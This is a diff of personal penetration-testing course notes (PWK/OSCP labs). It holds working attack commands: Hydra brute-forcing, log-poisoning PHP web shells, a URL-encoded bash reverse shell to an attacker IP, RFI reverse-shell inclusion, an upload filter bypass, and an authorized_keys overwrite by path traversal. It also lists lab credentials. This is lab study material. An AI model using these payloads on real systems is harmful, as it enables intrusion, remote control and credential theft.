@@ -59,7 +59,7 @@
 - PWK Labs  
   - Credentials (🔒 username:Eric.Wallows, password:EricLikesRunning800)
   - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`
-  - Find flag: `find / -type f -iname "flag.txt" 2>/dev/null`
+  - Find flag: `find / -name "flag.txt" 2>/dev/null`
 
 ## Methodology 
 
@@ -388,7 +388,7 @@
   systemctl start apache2
   cd /var/www/html
   ```
-- 
+  
 ### 12. Client-site attacks
 ### 13. Locating public exploits
 ### 14. Fixing exploits
@@ -402,8 +402,7 @@
       `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
     - password spraying > enumerate username from a valid password
       `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.160.201`
-   `  
-    - 
+
 ### 17. Windows Privilege Escalation
     - Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)
     - Enumeration
@@ -527,10 +526,10 @@
     `snmpwalk -c public -v1 -t 10 -Oa 192.168.165.151`
 
 ### Vulnerability Scanning  
-- 7.3.1 NSE vulnerability script
+- 7.3.1 NSE vulnerability script  
   `sudo nmap -sV -p 443 --script "vuln" 192.168.173.13`
-- 7.3.2 working with NSE script
-  **Capstone Labs:** Follow the steps above to perform the vulnerability scan with the custom NSE script on VM #1.
+- 7.3.2 working with NSE script  
+  **Capstone Labs:** Follow the steps above to perform the vulnerability scan with the custom NSE script on VM #1.  
   
   [Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)](https://www.exploit-db.com/exploits/50383)  
   `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`  
@@ -627,18 +626,19 @@
   - Grafana URL partial encoding bypass
     - `curl --path-as-is http://192.168.163.16:3000/public/plugins/alertlist/%2E./%2E./%2E./%2E./../../../../opt/install.txt`
 - 9.2.1 Local file inclusion (LFI)
-  - write system cmd to access.log file
-    `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`: embed system cmd
+  - write system cmd to access.log file  
+    `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`: embed system cmd  
     `GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.165%2F4444%200%3E%261%22`: run url encoding web shell command
-  - LFI /opt/admin.bak.php
+  - LFI **/opt/admin.bak.php**
     `curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
-  - windows LFI + Log poisoning C:\xampp\apache\logs\
-    `GET /meteor/index.php?page=C:/xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt `
+  - windows LFI + **Log poisoning** C:\xampp\apache\logs\
+    Modify user agent:  `<?php echo system($_GET['cmd']); ?>`
+    `GET /meteor/index.php?page=C:/xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt`
 - 9.2.2 PHP Wrappers
-  - LFI php://filter to include content of /var/www/html/backup.php
-    `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`
-  - LFI data:// PHP to execute uname -a
-    base64: echo -n '<?php echo system($_GET["cmd"]);?>'
+  - LFI **php://filter** to include content of /var/www/html/backup.php  
+    `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`  
+  - LFI **data://** PHP to execute uname -a  
+    base64: echo -n `<?php echo system($_GET["cmd"]);?>`      
     `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a"`
 - 9.2.3 Remote File inclusion (RFI)
   - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**
@@ -651,7 +651,22 @@
     4. nc -nvlp 4444
     5. `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`  
 - 9.3.1 Using executable files
+  - File upload + **bypass file extension filter** (.pHp) + read windows file C:\xampp\passwords.txt
+    `curl http://192.168.224.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\\xampp\\passwords.txt`
+  - **Web shell code executio**n
+    start Apache of webshell + nc listener + upload php-reverse-shell.php. Uploaded files in /var/www/html/  
+    `curl http://192.168.224.16/php-reverse-shell.php`  
+    `cat /opt/install.txt`  
 - 9.3.2 Using non executable files
+   - **overwrite the authorized_keys** file with the file upload mechanism + ssh port 2222  
+     at kali@kali home: `ssh-keygen`  `cat fileup.pub > authorized_keys`  
+
+     intercept burp upload request  
+     POST /upload HTTP/1.1  
+     filename=`../../../../../../../root/.ssh/authorized_keys`  
+
+     at kali@kali home: `rm ~/.ssh/known_hosts`  
+     `ssh -p 2222 -i fileup root@mountaindesserts.com`  
 - 9.4.1 OS Command injection
     
 ### Password Attacks  
